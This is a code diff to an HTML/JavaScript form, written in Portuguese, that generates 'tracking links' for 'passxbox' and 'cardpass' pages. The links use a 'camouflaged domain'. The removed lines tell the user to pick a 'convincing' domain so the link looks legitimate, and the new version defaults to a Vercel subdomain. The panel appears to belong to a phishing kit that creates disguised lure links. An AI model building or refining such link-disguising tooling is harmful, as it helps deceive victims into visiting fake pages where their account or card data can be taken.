@@ -583,21 +583,20 @@
                         </small>
                     </div>
                     <div class="form-group">
-                        <label for="customDomain">🌐 Domínio Camuflado (OBRIGATÓRIO para produção):</label>
+                        <label for="customDomain">🌐 Domínio Camuflado (Opcional):</label>
                         <input 
                             type="text" 
                             id="customDomain" 
                             name="customDomain" 
-                            placeholder="passxbox.com ou seu-dominio.com"
+                            placeholder="passxbox.vercel.app (deixe vazio para usar automaticamente)"
                             autocomplete="off"
-                            required
                         >
-                        <small style="display: block; margin-top: 5px; color: #dc3545; font-size: 12px;">
-                            <strong>⚠️ IMPORTANTE:</strong> Este domínio aparecerá no link gerado!<br>
-                            • Para desenvolvimento local: use <code>passxbox.com</code> (será usado no link)<br>
-                            • Para produção: use seu domínio real (ex: <code>meudominio.com</code>)<br>
-                            • O link gerado será: <code>https://[SEU-DOMINIO]/[ID]</code><br>
-                            • <strong style="color: #dc3545;">NÃO deixe vazio!</strong> Sempre use um domínio convincente.
+                        <small style="display: block; margin-top: 5px; color: #666; font-size: 12px;">
+                            <strong>💡 DICA:</strong><br>
+                            • <strong>Deixe vazio</strong> para usar automaticamente o domínio da Vercel (<code>passxbox.vercel.app</code>)<br>
+                            • Ou digite um domínio que você possui e configurou no DNS (ex: <code>meudominio.com</code>)<br>
+                            • O link gerado será: <code>https://[DOMINIO]/[ID]</code><br>
+                            • <strong style="color: #dc3545;">ATENÇÃO:</strong> Se usar um domínio que não está configurado no DNS, o link não funcionará!
                         </small>
                     </div>
                     <button type="submit" class="btn">
@@ -697,13 +696,7 @@
             const usePassXbox = pageType === 'passxbox';
             const useCardPass = pageType === 'cardpass';
             const customDomain = document.getElementById('customDomain').value.trim();
-            
-            if (!customDomain) {
-                showAlert('⚠️ Por favor, preencha o domínio camuflado!\n\nExemplo: passxbox.com\n\nEste domínio aparecerá no link gerado para parecer legítimo.', 'error');
-                submitBtn.disabled = false;
-                submitBtn.innerHTML = '<span>🚀</span> Gerar Link de Rastreamento';
-                return;
-            }
+            // Remover validação obrigatória - pode deixar vazio para usar domínio automático
 
             try {
                 // Timeout de 10 segundos
